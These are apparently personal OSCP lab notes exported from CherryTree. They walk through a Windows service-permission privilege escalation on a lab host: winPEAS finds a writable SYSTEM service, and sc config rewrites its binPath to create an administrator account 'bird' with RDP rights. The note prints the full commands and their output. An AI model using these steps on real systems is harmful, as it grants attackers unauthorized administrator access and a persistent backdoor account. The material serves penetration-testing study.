<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>webdriveservice</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># webdriveservice</h1></strong><br /><br /><strong>Examples</strong><br />â€¢ oscp 10.2.2.22 - Carol - Windows 7 Ultimate 7601<br /><br /><strong><h2>## How-to</h2></strong><br />Run <code>winPEAS.bat</code>.<br />It identifies the webdrive service running as SYSTEM, and we also have write permissions to it.<br /><div class="codebox"><div class="codebox">C:\Users\carol\AppData\Local\Temp&gt;\\tslclient\winPEAS.bat&nbsp;&gt;&nbsp;winpeas.log<br />[...]<br />_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-&gt;&nbsp;[*]&nbsp;SERVICES&nbsp;VULNERABILITIES&nbsp;&lt;_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-<br />[...]<br />C:\Program&nbsp;Files\WebDrive\wdService.exe&nbsp;NT&nbsp;AUTHORITY\SYSTEM:(I)(F)</div></div><br /><br />Have a look at <code>webdriveservice</code>.<br />It&#39;s running and stoppable.<br /><div class="codebox"><div class="codebox">C:\Users\carol\AppData\Local\Temp&gt;sc&nbsp;query&nbsp;webdriveservice<br /><br />SERVICE_NAME:&nbsp;webdriveservice<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TYPE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;110&nbsp;&nbsp;WIN32_OWN_PROCESS&nbsp;&nbsp;(interactive)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;4&nbsp;&nbsp;RUNNING<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(STOPPABLE,&nbsp;PAUSABLE,&nbsp;ACCEPTS_SHUTDOWN)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WIN32_EXIT_CODE&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0&nbsp;&nbsp;(0x0)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SERVICE_EXIT_CODE&nbsp;&nbsp;:&nbsp;0&nbsp;&nbsp;(0x0)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CHECKPOINT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0x0<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WAIT_HINT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0x0</div></div><br /><br />Change the service&#39;s startup &quot;binary&quot; to a command which creates new user, adds it to the admin group, and gives them RDP permissions.<br /><div class="codebox"><div class="codebox">C:\Users\carol\AppData\Local\Temp&gt;sc&nbsp;config&nbsp;webdriveservice&nbsp;binPath=&nbsp;&quot;cmd&nbsp;/c&nbsp;net<br />&nbsp;user&nbsp;bird&nbsp;Bird123!&nbsp;/add&nbsp;&amp;&amp;&nbsp;net&nbsp;localgroup&nbsp;administrators&nbsp;bird&nbsp;/add&nbsp;&amp;&amp;&nbsp;net&nbsp;local<br />group&nbsp;&#39;Remote&nbsp;Desktop&nbsp;Users&#39;&nbsp;bird&nbsp;/add&quot;<br />[SC]&nbsp;ChangeServiceConfig&nbsp;SUCCESS</div></div><br /><br />Double check the config has changed.<br /><div class="codebox"><div class="codebox">C:\Users\carol\AppData\Local\Temp&gt;sc&nbsp;qc&nbsp;webdriveservice<br />[SC]&nbsp;QueryServiceConfig&nbsp;SUCCESS<br /><br />SERVICE_NAME:&nbsp;webdriveservice<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TYPE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;110&nbsp;&nbsp;WIN32_OWN_PROCESS&nbsp;(interactive)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;START_TYPE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;2&nbsp;&nbsp;&nbsp;AUTO_START<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ERROR_CONTROL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0&nbsp;&nbsp;&nbsp;IGNORE<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BINARY_PATH_NAME&nbsp;&nbsp;&nbsp;:&nbsp;cmd&nbsp;/c&nbsp;net&nbsp;user&nbsp;bird&nbsp;Bird123!&nbsp;/add&nbsp;&amp;&amp;&nbsp;net&nbsp;localgrou<br />p&nbsp;administrators&nbsp;bird&nbsp;/add&nbsp;&amp;&amp;&nbsp;net&nbsp;localgroup&nbsp;&#39;Remote&nbsp;Desktop&nbsp;Users&#39;&nbsp;bird&nbsp;/add<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LOAD_ORDER_GROUP&nbsp;&nbsp;&nbsp;:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TAG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;0<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DISPLAY_NAME&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;WebDrive&nbsp;Service<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DEPENDENCIES&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SERVICE_START_NAME&nbsp;:&nbsp;LocalSystem</div></div><br /><br />It has!<br />Stop the service and start it again. <br />We clearly get an error because no service has actually been started.<br /><div class="codebox"><div class="codebox">C:\Users\carol\AppData\Local\Temp&gt;net&nbsp;stop&nbsp;webdriveservice<br />.<br />The&nbsp;WebDrive&nbsp;Service&nbsp;service&nbsp;was&nbsp;stopped&nbsp;successfully.<br /><br />C:\Users\carol\AppData\Local\Temp&gt;net&nbsp;start&nbsp;webdriveservice<br />The&nbsp;service&nbsp;is&nbsp;not&nbsp;responding&nbsp;to&nbsp;the&nbsp;control&nbsp;function.<br /><br />More&nbsp;help&nbsp;is&nbsp;available&nbsp;by&nbsp;typing&nbsp;NET&nbsp;HELPMSG&nbsp;2186.</div></div><br /><br />However, check the users on the system and we see that our command has run successfully.<br /><div class="codebox"><div class="codebox">C:\Users\carol\AppData\Local\Temp&gt;net&nbsp;users<br /><br />User&nbsp;accounts&nbsp;for&nbsp;\\CAROL<br /><br />-------------------------------------------------------------------------------<br />Administrator&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bird&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;carol<br />Guest<br />The&nbsp;command&nbsp;completed&nbsp;successfully.</div></div><br /></div>
</body>
</html>
